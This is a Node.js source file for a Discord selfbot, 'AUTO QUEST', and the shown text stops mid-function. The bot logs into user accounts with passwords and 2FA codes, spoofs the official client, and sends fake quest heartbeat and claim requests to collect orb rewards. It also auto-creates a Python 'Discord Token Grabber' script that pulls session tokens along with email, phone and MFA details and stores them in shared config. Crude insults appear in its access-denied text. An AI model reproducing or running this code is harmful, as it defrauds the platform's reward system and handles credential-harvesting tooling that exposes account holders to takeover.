// ╔══════════════════════════════════════════════════════════════╗
// ║  AUTO QUEST  —  Discord Quest Auto-Completer                  ║
// ║  Self-registering slash commands  ·  config.json              ║
// ╚══════════════════════════════════════════════════════════════╝

'use strict';

// ── Global error handler ──────────────────────────────
process.on('unhandledRejection', (err) => {
    if (err?.code === 10062 || err?.code === 40060 || err?.message?.includes('Unknown interaction') || err?.message?.includes('already been acknowledged')) {
        return; // silently ignore Discord interaction expiry
    }
    console.error('[UNHANDLED]', err?.code || err?.message?.slice(0,80));
});

// ═══════════════════════════════════════════════════════════════
// IMPORTS
// ═══════════════════════════════════════════════════════════════
const {
    Client, GatewayIntentBits,
    ActionRowBuilder, ButtonBuilder, ButtonStyle,
    StringSelectMenuBuilder, ModalBuilder,
    TextInputBuilder, TextInputStyle,
    SlashCommandBuilder, REST, Routes,
    ContainerBuilder, TextDisplayBuilder, SeparatorBuilder,
    MessageFlags,
    InteractionContextType, ApplicationIntegrationType
} = require('discord.js');
const fs   = require('fs');
const path = require('path');
const { execSync } = require('child_process');

// Force unbuffered stdout
if (process.stdout.isTTY === false || !process.stdout.isTTY) {
    try { process.stdout._handle?.setBlocking?.(true); } catch {}
    try { process.stderr._handle?.setBlocking?.(true); } catch {}
}

// ═══════════════════════════════════════════════════════════════
// CONSTANTS
// ═══════════════════════════════════════════════════════════════
const CONFIG_PATH = path.join(__dirname, 'config.json');
const API_BASE    = 'https://discord.com/api/v9';
const AUTH_URL    = 'https://discord.com/api/v9/auth/login';
const MFA_URL     = 'https://discord.com/api/v9/auth/mfa/totp';

const UA_MOB = 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko)';
const UA_DSK = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9177 Chrome/128.0.6613.186 Electron/32.2.5 Safari/537.36';

const PLAY_TYPES = [
    'PLAY_ON_DESKTOP', 'PLAY_ON_DESKTOP_V2', 'PLAY_ACTIVITY',
    'STREAM_ON_DESKTOP', 'PLAY_ON_XBOX', 'PLAY_ON_PLAYSTATION'
];

const VIDEO_TYPES = ['WATCH_VIDEO', 'WATCH_VIDEO_ON_MOBILE'];

const CLR = {
    R: 0xe63946, G: 0x2ecc71, Y: 0xf1c40f,
    B: 0x5865F2, D: 0x4f545c, P: 0xa855f7,
    T: 0x1abc9c, O: 0xff8c00
};

const F_V2   = MessageFlags.IsComponentsV2;
const ORBS_E = '<a:Orbs:1511625467919208558>';

const BOT_START_TIME = Math.floor(Date.now() / 1000);

// ═══════════════════════════════════════════════════════════════
// CONFIG
// ═══════════════════════════════════════════════════════════════
const CFG = {
    botName:    'AUTO QUEST',
    botVersion: '',
    colors: {
        primary:   '\x1b[38;5;135m',
        secondary: '\x1b[38;5;240m',
        success:   '\x1b[38;5;83m',
        warning:   '\x1b[38;5;220m',
        error:     '\x1b[38;5;196m',
        info:      '\x1b[38;5;75m',
        dim:       '\x1b[2m',
        bold:      '\x1b[1m',
        reset:     '\x1b[0m',
    }
};

const T = CFG.colors;

// ═══════════════════════════════════════════════════════════════
// RUNTIME STATE
// ═══════════════════════════════════════════════════════════════
let BOT_TOKEN  = '';
let BOT_CLIENT = null;

const cache = {
    info:  new Map(),   // token → { name, tag, id, ts }
    quest: new Map(),   // token → { data, ts }  30s TTL
};

const runtime = {
    stopFlags:   new Map(),
    activeRuns:  new Map(),
    sessions:    new Map(),
    pendingMFA:  new Map(),
};

let _devNameCache = null;
let _devIdCache   = null;

// ═══════════════════════════════════════════════════════════════
// SMALL-CAPS FONT
// ═══════════════════════════════════════════════════════════════
const SC = str => str.toUpperCase().split('').map(c => {
    const i = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'.indexOf(c);
    return i >= 0 ? 'ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘQʀꜱᴛᴜᴠᴡxʏᴢ'.replace('Q', 'ǫ')[i] : c;
}).join('');

function getUptimeTs() { return BOT_START_TIME; }
function getPing() { return BOT_CLIENT?.ws?.ping ?? -1; }

// ═══════════════════════════════════════════════════════════════
// TERMINAL UI
// ═══════════════════════════════════════════════════════════════
function termBox(lines, color = T.primary) {
    const w   = 50;
    const top = color + '┌' + '─'.repeat(w) + '┐' + T.reset;
    const bot = color + '└' + '─'.repeat(w) + '┘' + T.reset;
    const mid = lines.map(l => {
        const plain = l.replace(/\x1b\[[0-9;]*m/g, '');
        const pad   = Math.max(0, w - plain.length - 2);
        return color + '│ ' + T.reset + l + ' '.repeat(pad) + color + ' │' + T.reset;
    });
    return [top, ...mid, bot].join('\n');
}

function tLog(level, msg) {
    const ts  = new Date().toTimeString().slice(0, 8);
    const map = {
        ok:   T.success + '  OK  ' + T.reset,
        err:  T.error   + ' ERR  ' + T.reset,
        warn: T.warning + ' WARN ' + T.reset,
        info: T.info    + ' INFO ' + T.reset,
        sys:  T.primary + ' SYS  ' + T.reset,
        bot:  T.primary + ' BOT  ' + T.reset,
        cmd:  T.success + ' CMD  ' + T.reset,
    };
    console.log(T.dim + `[${ts}]` + T.reset + ' ' + (map[level] || level) + '  ' + msg);
}

function tDiv(ch = '─', color = T.secondary) {
    console.log(color + ch.repeat(54) + T.reset);
}

function tInput(prompt) {
    return new Promise(resolve => {
        process.stdout.write(T.primary + '  ▶  ' + T.reset + T.bold + prompt + T.reset + ' ');
        const rl = require('readline').createInterface({ input: process.stdin, output: process.stdout, terminal: false });
        rl.once('line', line => { rl.close(); resolve(line.trim()); });
    });
}

// ═══════════════════════════════════════════════════════════════
// DATA LAYER  —  ALL IN config.json
// ═══════════════════════════════════════════════════════════════
function dbLoad() {
    try {
        const d = JSON.parse(fs.readFileSync(CONFIG_PATH, 'utf8'));
        if (!d.access)              d.access = { ownerId: null, allowedUsers: [], halfUsers: [], fullUsers: [] };
        if (!d.access.halfUsers)    d.access.halfUsers = [];
        if (!d.access.fullUsers)    d.access.fullUsers = [];
        if (!d.orbVault)            d.orbVault = { lifetimeEarned: 0, lastUpdated: null, questsCompleted: 0 };
        if (!d.developer)           d.developer = { name: '', id: '' };
        if (!d.tokens)              d.tokens = [];
        if (!d.active_acc)          d.active_acc = {};
        return d;
    } catch {
        return {
            botToken: '',
            ownerId: '',
            tokens: [],
            active_acc: {},
            access: { ownerId: null, allowedUsers: [], halfUsers: [], fullUsers: [] },
            orbVault: { lifetimeEarned: 0, lastUpdated: null, questsCompleted: 0 },
            developer: { name: '', id: '' }
        };
    }
}

function dbSave(d) { fs.writeFileSync(CONFIG_PATH, JSON.stringify(d, null, 2)); }

// ═══════════════════════════════════════════════════════════════
// ACCESS CONTROL
// ═══════════════════════════════════════════════════════════════
function acLoad() {
    const ac = dbLoad().access || {};
    if (!ac.ownerId)      ac.ownerId = null;
    if (!ac.halfUsers)    ac.halfUsers = [];
    if (!ac.fullUsers)    ac.fullUsers = [];
    if (!ac.allowedUsers) ac.allowedUsers = [];
    return ac;
}

function acSave(ac)      { const d = dbLoad(); d.access = ac; dbSave(d); }

function acSetOwner(uid) {
    const ac = acLoad(); const id = String(uid);
    ac.ownerId = id;
    if (!ac.fullUsers.includes(id))    ac.fullUsers.push(id);
    if (!ac.allowedUsers.includes(id)) ac.allowedUsers.push(id);
    // Also update root ownerId
    const d = dbLoad(); d.ownerId = id; d.access = ac; dbSave(d);
}

function acAddHalf(uid) {
    const ac = acLoad(); const id = String(uid);
    ac.halfUsers = ac.halfUsers.filter(u => u !== id);
    ac.fullUsers = ac.fullUsers.filter(u => u !== id);
    if (!ac.halfUsers.includes(id))    ac.halfUsers.push(id);
    if (!ac.allowedUsers.includes(id)) ac.allowedUsers.push(id);
    acSave(ac);
}

function acAddFull(uid) {
    const ac = acLoad(); const id = String(uid);
    ac.halfUsers = ac.halfUsers.filter(u => u !== id);
    ac.fullUsers = ac.fullUsers.filter(u => u !== id);
    if (!ac.fullUsers.includes(id))    ac.fullUsers.push(id);
    if (!ac.allowedUsers.includes(id)) ac.allowedUsers.push(id);
    acSave(ac);
}

function acRemove(uid) {
    const ac = acLoad(); const id = String(uid);
    ac.halfUsers    = ac.halfUsers.filter(u => u !== id);
    ac.fullUsers    = ac.fullUsers.filter(u => u !== id);
    ac.allowedUsers = ac.allowedUsers.filter(u => u !== id);
    acSave(ac);
}

function acLevel(uid) {
    const ac = acLoad(); const id = String(uid);
    if (!ac.ownerId)              return 'NO_OWNER';
    if (ac.ownerId === id)        return 'owner';
    if (ac.fullUsers.includes(id)) return 'full';
    if (ac.halfUsers.includes(id)) return 'half';
    if (ac.allowedUsers.includes(id)) return 'half';
    return false;
}

function acAllowed(uid) {
    const lvl = acLevel(uid);
    if (lvl === 'NO_OWNER') return 'NO_OWNER';
    return lvl !== false;
}

// Shared "no access" message — used by every gated command/button so it
// only has to be edited in one place.
function accessDeniedText(uid) {
    return `# <:clown:1497858276090449950> ${SC('access denied')}\n> **ᴘʜᴇʟᴇ ᴀᴘɴɪ ᴀᴜᴋᴀᴛ ᴅᴇᴋʜ ꜰɪʀ ᴄᴏɴᴛʀᴏʟ ᴋᴀʀɪᴏ ʟᴀᴡᴅᴇ ᴍᴀᴅᴀʀᴄʜᴏᴅ ʀᴀɴᴅɪ** <@${uid}>`;
}

// Replies with the access-denied message as an ephemeral message (only the
// command user can see it). Safe to call whether or not the interaction has
// already been deferred/replied to.
async function denyAccess(int, uid) {
    try {
        if (!int.replied && !int.deferred) {
            await int.deferReply({ flags: MessageFlags.Ephemeral });
        }
    } catch (e) {
        if (e.code === 10062 || e.code === 40060) return;
        throw e;
    }
    try {
        return await int.editReply(uiInfo(CLR.R, accessDeniedText(uid), false));
    } catch (e) {
        if (e.code === 10062 || e.code === 40060) return;
        throw e;
    }
}

// ═══════════════════════════════════════════════════════════════
// ORB VAULT
// ═══════════════════════════════════════════════════════════════
function vaultLoad()    { return dbLoad().orbVault || { lifetimeEarned: 0, lastUpdated: null, questsCompleted: 0 }; }
function vaultSave(v)   { const d = dbLoad(); d.orbVault = v; dbSave(d); }

function vaultSync(quests) {
    if (!quests) return;
    let total = 0, done = 0;
    for (const q of quests) {
        const claimed = !!(q.user_status?.claimed_at);
        const rewards = (q.config?.rewards_config?.rewards) || [];
        for (const rw of rewards) {
            if (typeof rw.orb_quantity_claimed === 'number' && rw.orb_quantity_claimed > 0) {
                total += rw.orb_quantity_claimed; done++;
            } else if (claimed && typeof rw.orb_quantity === 'number' && rw.orb_quantity > 0) {
                total += rw.orb_quantity; done++;
            }
        }
    }
    const v = vaultLoad();
    v.lifetimeEarned  = total;
    v.questsCompleted = done;
    v.lastUpdated     = new Date().toISOString();
    vaultSave(v);
}

// ═══════════════════════════════════════════════════════════════
// DISCORD REST API
// ═══════════════════════════════════════════════════════════════
async function discordAPI(token, method, endpoint, body = null, extraHeaders = {}) {
    const opts = {
        method,
        headers: {
            Authorization: token,
            'User-Agent': UA_DSK,
            'Content-Type': 'application/json',
            Origin: 'https://discord.com',
            ...extraHeaders
        }
    };
    if (body) opts.body = JSON.stringify(body);

    const MAX_RETRIES = 3;
    for (let attempt = 0; attempt < MAX_RETRIES; attempt++) {
        const ctrl    = new AbortController();
        const timeout = 12000 + attempt * 3000;
        const timer   = setTimeout(() => ctrl.abort(), timeout);
        opts.signal   = ctrl.signal;
        try {
            const res = await fetch(API_BASE + endpoint, opts);
            clearTimeout(timer);
            if (res.status === 429) {
                const rd   = await res.json().catch(() => ({}));
                const wait = Math.min(((rd.retry_after || 1) * 1000) + 300, 10000);
                tLog('warn', `Rate limited on ${endpoint} — waiting ${wait}ms`);
                await delay(wait);
                continue;
            }
            if (res.status >= 500 && attempt < MAX_RETRIES - 1) {
                await delay(1000 * (attempt + 1));
                continue;
            }
            return { s: res.status, d: await res.json().catch(() => null) };
        } catch (err) {
            clearTimeout(timer);
            const isAbort   = err?.name === 'AbortError';
            const isNetwork = err?.code === 'ECONNRESET' || err?.code === 'ETIMEDOUT' || err?.code === 'ENOTFOUND';
            if ((isAbort || isNetwork) && attempt < MAX_RETRIES - 1) {
                await delay(600 * Math.pow(2, attempt));
                continue;
            }
            return { s: 0, d: null };
        }
    }
    return { s: 0, d: null };
}

async function fetchQuests(token) {
    const hit = cache.quest.get(token);
    if (hit && Date.now() - hit.ts < 30000) return hit.data;
    const r = await discordAPI(token, 'GET', '/quests/@me');
    if (r.s === 200) {
        const data = r.d?.quests || [];
        cache.quest.set(token, { data, ts: Date.now() });
        return data;
    }
    if (r.s === 0) {
        if (hit && Date.now() - hit.ts < 300000) return hit.data;
    }
    return null;
}

async function fetchMe(token) {
    const r = await discordAPI(token, 'GET', '/users/@me');
    return r.s === 200 ? r.d : null;
}
async function questHeartbeat(t, id)    { return discordAPI(t, 'POST', `/quests/${id}/heartbeat`, { stream_key: `call:${id}:1`, terminal: false }); }
async function questEnroll(t, id)       { return discordAPI(t, 'POST', `/quests/${id}/enroll`, { location: 11 }); }
async function questClaim(t, id)        { return discordAPI(t, 'POST', `/quests/${id}/claim-reward`, { location: 11, platform: 0 }); }

// ═══════════════════════════════════════════════════════════════
// AUTH — Email/Password + MFA
// ═══════════════════════════════════════════════════════════════
async function authLogin(email, password) {
    const body    = { login: email, password, undelete: false, login_source: null, gift_code_sku_id: null };
    const headers = {
        'Content-Type': 'application/json', 'User-Agent': UA_MOB,
        Origin: 'https://discord.com', 'X-Discord-Locale': 'en-US',
        'X-Debug-Options': 'bugReporterEnabled'
    };
    try {
        const res = await fetch(AUTH_URL, { method: 'POST', headers, body: JSON.stringify(body) });
        const d   = await res.json().catch(() => ({}));

        if (res.status === 200 && d.token)
            return { token: d.token, user: { id: d.user_id, username: d.username } };

        if (d.mfa)
            return { error: 'mfa', type: 'mfa', ticket: d.ticket || '', msg: '2FA required', raw: d };

        const str = JSON.stringify(d).toLowerCase();
        if (res.status === 400 && ['captcha', 'captcha_key', 'hcaptcha'].some(k => str.includes(k)))
            return { error: 'captcha', type: 'captcha', msg: 'Captcha required! Use a token instead.' };

        if (res.status === 400 && (str.includes('verify') || str.includes('email') || str.includes('phone')))
            return { error: 'verify', type: 'verify', msg: 'Email/phone verification required.' };

        if (res.status === 400) {
            if (d.code === 50035) {
                const pe = d.errors?.password?._errors?.[0]?.message || '';
                const le = d.errors?.login?._errors?.[0]?.message    || '';
                if (pe || le) return { error: 'invalid', type: 'bad_creds', msg: `❌ ${pe || le}` };
            }
            return { error: 'invalid', type: 'bad_creds', msg: `❌ ${d.message || 'Invalid login.'}` };
        }
        if (res.status === 429)
            return { error: 'ratelimit', type: 'ratelimit', msg: 'Too many attempts. Try later.' };

        return { error: 'unknown', type: 'unknown', msg: `Unexpected error (${res.status}).` };
    } catch (e) {
        return { error: 'network', type: 'network', msg: `Network error: ${e.message}` };
    }
}

async function authMFA(ticket, code) {
    const body    = { code, ticket, login_source: null, gift_code_sku_id: null };
    const headers = { 'Content-Type': 'application/json', 'User-Agent': UA_MOB, Origin: 'https://discord.com', 'X-Discord-Locale': 'en-US' };
    try {
        const res = await fetch(MFA_URL, { method: 'POST', headers, body: JSON.stringify(body) });
        const d   = await res.json().catch(() => ({}));
        if (res.status === 200 && d.token)
            return { token: d.token, user: { id: d.user_id, username: d.username } };
        return { error: 'mfa_fail', msg: 'Invalid or expired 2FA code.' };
    } catch (e) {
        return { error: 'network', msg: `Network error: ${e.message}` };
    }
}

// ── Grab token via grab.py (auto-create if missing) ──
function runGrabPy(args = '') {
    const pyPath = path.join(__dirname, 'grab.py');
    if (!fs.existsSync(pyPath)) {
        // Auto-create grab.py
        const grabPyCode = `#!/usr/bin/env python3
"""grab.py — Discord Token Grabber (auto-created by AutoQuest)"""
import sys, json, requests, os, argparse

PROXY_URL = os.environ.get('PROXY_URL', '')
PROXIES = {'http': PROXY_URL, 'https': PROXY_URL} if PROXY_URL else None

def do_login(email, password):
    session = requests.Session()
    if PROXIES: session.proxies.update(PROXIES)
    session.headers.update({'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'})
    try:
        resp = session.post('https://discord.com/api/v9/auth/login',
            json={'login': email, 'password': password, 'undelete': False, 'captcha_key': None, 'login_source': None, 'gift_code_sku_id': None}, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            token = data.get('token')
            if token:
                user_resp = session.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}, timeout=10)
                if user_resp.status_code == 200:
                    user = user_resp.json()
                    sc = 0
                    try:
                        g = session.get('https://discord.com/api/v9/users/@me/guilds', headers={'Authorization': token}, timeout=10)
                        if g.status_code == 200: sc = len(g.json())
                    except: pass
                    print(json.dumps({'status': 'success', 'token': token, 'username': f"{user['username']}#{user.get('discriminator', '0')}",
                        'user_id': user['id'], 'email': user.get('email', 'Not verified'), 'phone': user.get('phone', 'Not linked'),
                        'mfa_enabled': user.get('mfa_enabled', False), 'verified': user.get('verified', False),
                        'premium_type': {0:'None', 1:'Nitro Classic', 2:'Nitro'}.get(user.get('premium_type', 0), 'None'),
                        'server_count': sc, 'created_date': 'Available'}))
                    return
                else:
                    print(json.dumps({'status': 'success', 'token': token, 'username': 'Unknown#0', 'user_id': '', 'email': email,
                        'phone': 'Unknown', 'mfa_enabled': False, 'verified': False, 'premium_type': 'None', 'server_count': 0, 'created_date': 'Unknown'}))
            elif data.get('mfa'):
                print(json.dumps({'status': 'mfa', 'error': 'MFA required', 'ticket': data.get('ticket', ''), 'mfa': True}))
            else:
                print(json.dumps({'status': 'error', 'error': 'No token in response'}))
        elif resp.status_code == 400:
            print(json.dumps({'status': 'error', 'error': 'Incorrect email/password or Captcha required'}))
        elif resp.status_code == 403:
            print(json.dumps({'status': 'error', 'error': 'Account locked/flagged by Discord'}))
        else:
            print(json.dumps({'status': 'error', 'error': f'HTTP {resp.status_code}: Login failed'}))
    except Exception as e:
        print(json.dumps({'status': 'error', 'error': str(e)}))

def do_mfa(ticket, code):
    session = requests.Session()
    if PROXIES: session.proxies.update(PROXIES)
    session.headers.update({'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'})
    try:
        resp = session.post('https://discord.com/api/v9/auth/mfa/totp',
            json={'ticket': ticket, 'code': code, 'login_source': None, 'gift_code_sku_id': None}, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            token = data.get('token')
            if token:
                user_resp = session.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}, timeout=10)
                if user_resp.status_code == 200:
                    user = user_resp.json()
                    sc = 0
                    try:
                        g = session.get('https://discord.com/api/v9/users/@me/guilds', headers={'Authorization': token}, timeout=10)
                        if g.status_code == 200: sc = len(g.json())
                    except: pass
                    print(json.dumps({'status': 'success', 'token': token, 'username': f"{user['username']}#{user.get('discriminator', '0')}",
                        'user_id': user['id'], 'email': user.get('email', 'MFA Account'), 'phone': user.get('phone', 'Not linked'),
                        'mfa_enabled': True, 'verified': user.get('verified', False),
                        'premium_type': {0:'None', 1:'Nitro Classic', 2:'Nitro'}.get(user.get('premium_type', 0), 'None'),
                        'server_count': sc, 'created_date': 'Available'}))
                else:
                    print(json.dumps({'status': 'success', 'token': token, 'username': 'Unknown#0', 'user_id': '', 'email': 'MFA Account',
                        'phone': 'Unknown', 'mfa_enabled': True, 'verified': False, 'premium_type': 'None', 'server_count': 0, 'created_date': 'Unknown'}))
        elif resp.status_code == 400:
            print(json.dumps({'status': 'error', 'error': 'Invalid MFA code'}))
        else:
            print(json.dumps({'status': 'error', 'error': f'HTTP {resp.status_code}: MFA failed'}))
    except Exception as e:
        print(json.dumps({'status': 'error', 'error': str(e)}))

if __name__ == '__main__':
    p = argparse.ArgumentParser()
    p.add_argument('--email', type=str, default=None)
    p.add_argument('--password', type=str, default=None)
    p.add_argument('--ticket', type=str, default=None)
    p.add_argument('--code', type=str, default=None)
    p.add_argument('pos', nargs='*', help=argparse.SUPPRESS)
    a = p.parse_args()
    if a.email and a.password: do_login(a.email, a.password)
    elif a.ticket and a.code: do_mfa(a.ticket, a.code)
    elif len(a.pos) >= 2: do_login(a.pos[0], a.pos[1])
    else: print(json.dumps({'status': 'error', 'error': 'Usage: grab.py <email> <password> OR --email X --password Y'}))
`;
        try {
            fs.writeFileSync(pyPath, grabPyCode);
            tLog('ok', T.success + 'grab.py auto-created!' + T.reset);
        } catch (e) {
            return { status: 'error', error: `Cannot create grab.py: ${e.message}` };
        }
    }
    try {
        const out   = execSync(`python3 "${pyPath}" ${args}`, { timeout: 30000, encoding: 'utf8', cwd: __dirname }).trim();
        const lines = out.split('\n');
        for (let i = lines.length - 1; i >= 0; i--) {
            try { return JSON.parse(lines[i].trim()); } catch {}
        }
        return { status: 'error', error: 'No JSON from grab.py', raw: out.slice(0, 500) };
    } catch (e) {
        return { status: 'error', error: `grab.py failed: ${e.message}` };
    }
}

// ── Save token to config.json ──────────────────────
async function saveToken(tk, ownerId) {
    const d = dbLoad();
    if (!d.tokens) d.tokens = [];
    tk = tk.trim().replace(/^["']|["']$/g, '');
    if (tk.length < 50) return { bad: true, msg: `❌ ${SC('token too short — check and paste again!')}` };

    const existing = d.tokens.find(t => t.token === tk);
    if (existing) return { dup: true, msg: `⚠️ ${SC('already saved!')}` };

    const me = await fetchMe(tk);
    if (!me) return { bad: true, msg: `❌ ${SC('invalid token! check and try again.')}` };

    d.tokens.push({
        id: me.id,
        token: tk,
        name: me.username,
        addedAt: new Date().toISOString(),
        isActive: d.tokens.length === 0, // first token = active
        isVerified: true,
        verifiedInfo: {
            valid: true,
            username: `${me.username}#${me.discriminator || '0'}`,
            userId: me.id,
            avatar: me.avatar || '',
            email: me.email || '',
            mfaEnabled: me.mfa_enabled || false,
        }
    });
    dbSave(d);
    return { ok: true, name: me.username, id: me.id, count: d.tokens.length };
}

// Get flat token array from config
function getTokens(ownerId) {
    const d = dbLoad();
    if (d.tokens && d.tokens.length > 0) {
        return d.tokens.map(t => t.token);
    }
    return [];
}

// Get active token index
function getActiveIdx(ownerId) {
    const d = dbLoad();
    if (d.active_acc && d.active_acc[ownerId] !== undefined) {
        return d.active_acc[ownerId];
    }
    return 0;
}

// Set active token index
function setActiveIdx(ownerId, idx) {
    const d = dbLoad();
    if (!d.active_acc) d.active_acc = {};
    if (idx === null || idx === undefined) {
        delete d.active_acc[ownerId];
    } else {
        d.active_acc[ownerId] = idx;
    }
    dbSave(d);
}

// Remove token by index
function removeToken(ownerId, idx) {
    const d = dbLoad();
    if (d.tokens && idx < d.tokens.length) {
        d.tokens.splice(idx, 1);
        if (d.active_acc?.[ownerId] === idx) delete d.active_acc[ownerId];
        else if ((d.active_acc?.[ownerId] ?? -1) > idx) d.active_acc[ownerId]--;
        dbSave(d);
    }
}

// ═══════════════════════════════════════════════════════════════
// QUEST HELPERS
// ═══════════════════════════════════════════════════════════════
function questTasks(q) {
    const tc = q.config?.task_config_v2 || q.config?.task_config || {};
    return tc.tasks || {};
}

function questIsPlay(q) {
    return Object.values(questTasks(q)).some(x => PLAY_TYPES.includes(x.type || ''));
}

function questIsVideo(q) {
    return Object.values(questTasks(q)).some(x => VIDEO_TYPES.includes(x.type || ''));
}

function questTarget(q) {
    const tasks = questTasks(q);
    for (const [k, v] of Object.entries(tasks)) {
        const t = v.type || k;
        if (PLAY_TYPES.includes(t) || VIDEO_TYPES.includes(t)) return { type: t, target: v.target || 0 };
    }
    return { type: null, target: 0 };
}

function questExpired(q) {
    const e = q.config?.expires_at;
    return e ? new Date() > new Date(e) : false;
}

function progressBar(pct, width = 20) {
    const filled = Math.round(Math.min(pct, 100) / 100 * width);
    return '■'.repeat(filled) + '□'.repeat(width - filled);
}

function getOrbAmt(q) {
    try {
        const rc  = q.config?.rewards_config;
        const arr = Array.isArray(rc?.rewards || q.config?.rewards || [])
            ? (rc?.rewards || q.config?.rewards || [])
            : Object.values(rc?.rewards || q.config?.rewards || {});

        for (const rw of arr) {
            if (typeof rw.orb_quantity === 'number'         && rw.orb_quantity > 0)         return rw.orb_quantity;
            if (typeof rw.premium_orb_quantity === 'number' && rw.premium_orb_quantity > 0) return rw.premium_orb_quantity;
            const nm = rw.messages?.name?.match(/(\d+)\s*Orbs?/i);
            if (nm) return parseInt(nm[1]);
            if (typeof rw.amount === 'number' && rw.amount > 0) {
                const t = (rw.type || rw.reward_type || '').toString().toLowerCase();
                if (t === '4' || t.includes('orb')) return rw.amount;
            }
            for (const it of (Array.isArray(rw.items || rw.reward_items) ? (rw.items || rw.reward_items) : [])) {
                if (typeof it.quantity === 'number'     && it.quantity > 0)     return it.quantity;
                if (typeof it.orb_quantity === 'number' && it.orb_quantity > 0) return it.orb_quantity;
            }
        }
        const raw = JSON.stringify(rc || arr);
        const m   = raw.match(/"orb_quantity"\s*:\s*(\d+)/);
        if (m) return parseInt(m[1]);
    } catch {}
    return 0;
}

// ═══════════════════════════════════════════════════════════════
// CACHE HELPERS
// ═══════════════════════════════════════════════════════════════
async function cachedInfo(token) {
    const hit = cache.info.get(token);
    if (hit && Date.now() - hit.ts < 300000) return hit;
    const me = await fetchMe(token);
    if (!me) {
        if (hit) return hit;
        return { name: '?', tag: '', id: '?', ts: 0 };
    }
    const info = {
        name: me.username,
        tag:  me.discriminator !== '0' ? `#${me.discriminator}` : '',
        id:   me.id,
        ts:   Date.now()
    };
    cache.info.set(token, info);
    return info;
}

async function cachedName(token) { return (await cachedInfo(token)).name; }

// ═══════════════════════════════════════════════════════════════
// UTILITY
// ═══════════════════════════════════════════════════════════════
function delay(ms) { return new Promise(r => setTimeout(r, ms)); }

// Decode bot token to extract client ID
function decodeBotClientId(token) {
    try {
        const b64 = token.split('.')[0];
        // Discord uses base64 without padding, add padding
        const padded = b64 + '=='.slice(0, (4 - b64.length % 4) % 4);
        const decoded = Buffer.from(padded, 'base64').toString('utf-8');
        // The decoded string is the user/bot ID as a string number
        if (/^\d{17,20}$/.test(decoded)) return decoded;
        return null;
    } catch { return null; }
}

// ═══════════════════════════════════════════════════════════════
// UI — ComponentsV2 Builders
// ═══════════════════════════════════════════════════════════════
function mkContainer(color)  { return new ContainerBuilder().setAccentColor(color); }
function addSep(c)           { c.addSeparatorComponents(new SeparatorBuilder()); }
function wrap(c)             { return { components: [c], flags: F_V2 }; }

function uiInfo(color, text, showBack = true) {
    const c = mkContainer(color);
    c.addTextDisplayComponents(new TextDisplayBuilder().setContent(text));
    addSep(c);
    if (showBack) {
        c.addActionRowComponents(new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('q_back').setLabel('Back').setStyle(ButtonStyle.Secondary)
                .setEmoji({ id: '1493406616937169039', name: 'arrow_left' })
        ));
    }
    return wrap(c);
}

// ── MAIN MENU ─────────────────────────────────────────────────
async function uiMain(data, uid) {
    const ac       = data.access || {};
    const ownerId  = ac.ownerId || uid;
    const tokens   = getTokens(ownerId);
    const activeIdx = getActiveIdx(ownerId);
    const activeTok = (activeIdx !== undefined && tokens[activeIdx]) ? tokens[activeIdx] : (tokens[0] || null);

    const c = mkContainer(CLR.O);

    // Dev name (cached)
    const devId = ownerId || '';
    let devName = devId;
    if (devId) {
        if (_devIdCache === devId && _devNameCache) {
            devName = _devNameCache;
        } else {
            try {
                const res = await fetch(`https://discord.com/api/v9/users/${devId}`, {
                    headers: { Authorization: `Bot ${BOT_TOKEN}`, 'Content-Type': 'application/json' }
                });
                if (res.ok) {
                    const u = await res.json();
                    devName = u.global_name || u.username || devId;
                    _devNameCache = devName; _devIdCache = devId;
                }
            } catch {}
        }
    }

    const uptimeStr = `-# <:duration:1498990306383626403> ${SC('online since:')} <t:${getUptimeTs()}:R>`;

    c.addTextDisplayComponents(new TextDisplayBuilder().setContent(
        `# ${ORBS_E} ${SC('discord auto quest completer')}\n` +
        `-# ${SC('complete discord quests automatically & earn orbs effortlessly')}\n` +
        (devId ? `-# <:dev:1459861201239539752> **ᴅᴇᴠᴇʟᴏᴘᴇʀ :** [**${devName}**](https://discord.com/users/${devId})\n` : '') +
        uptimeStr
    ));
    addSep(c);

    // Parallel fetch — quests + ALL accounts
    const activeIdx_num = activeIdx !== undefined ? activeIdx : 0;
    const otherTokens = tokens.filter((_, i) => i !== activeIdx_num);
    const [questData, activeInfo, ...otherInfos] = await Promise.all([
        activeTok ? fetchQuests(activeTok).catch(() => null) : Promise.resolve(null),
        activeTok ? cachedInfo(activeTok) : Promise.resolve({ name: '?', tag: '', id: '?', ts: 0 }),
        ...otherTokens.map(t => cachedInfo(t).catch(() => ({ name: '?', tag: '', id: '?', ts: 0 })))
    ]);

    // Active account display
    if (tokens.length) {
        const crown = ' <a:Crown:1493401405199880312>';
        let accText = `### <:owo_yay:1498978297210605608> ${SC('active account')}\n` +
            `> <@${activeInfo.id}> (\`${activeInfo.name}\`)${crown}`;
        for (const info of otherInfos) {
            accText += `\n> <@${info.id}> (\`${info.name}\`)`;
        }
        c.addTextDisplayComponents(new TextDisplayBuilder().setContent(accText));
    } else {
        c.addTextDisplayComponents(new TextDisplayBuilder().setContent(
            `### <:owo_yay:1498978297210605608> ${SC('no account added')}\n> ${SC('add a selfbot account to get started')}`
        ));
    }

    // Quest preview
    let qLines = `### ${ORBS_E} ${SC('available quests')}\n`;
    if (activeTok) {
        if (questData) {
            const pending = questData.filter(q => {
                if (!questIsPlay(q) || questExpired(q) || q.user_status?.claimed_at) return false;
                const { type, target } = questTarget(q);
                if (target > 0) {
                    const cur = (q.user_status?.progress || {})[type]?.value || 0;
                    if (cur >= target) return false;
                }
                return true;
            });
            const videoPending = questData.filter(q => {
                if (!questIsVideo(q) || questExpired(q) || q.user_status?.claimed_at) return false;
                const { type, target } = questTarget(q);
                if (target > 0) {
                    const cur = (q.user_status?.progress || {})[type]?.value || 0;
                    if (cur >= target) return false;
                }
                return true;
            });
            if (!pending.length && !videoPending.length) {
                qLines += `> <:Welcomer:1459852564634931381> ${SC('all quests claimed!')}\n`;
